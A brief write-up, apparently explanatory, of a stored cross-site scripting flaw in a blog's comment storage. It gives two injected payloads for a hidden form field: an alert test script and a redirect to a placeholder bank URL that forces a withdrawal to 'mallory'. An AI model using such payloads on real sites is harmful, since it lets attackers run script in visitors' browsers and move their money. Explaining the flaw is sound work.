----

Due to insufficient validation of client-side data, we can inject script directly into the file-based storage used for blog comments.

When making a new comment, we simply fill the &quot;posted&quot; hidden field's value with...

&lt;script&gt;alert('xss');&lt;script&gt;&quot;

...for an XSS attack OR...

&lt;script&gt;window.location=&quot;http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&lt;/script&gt;

...for a CRSF attack and otherwise submit the comment as usual.

Whenever that comment is viewed, the script is executed.
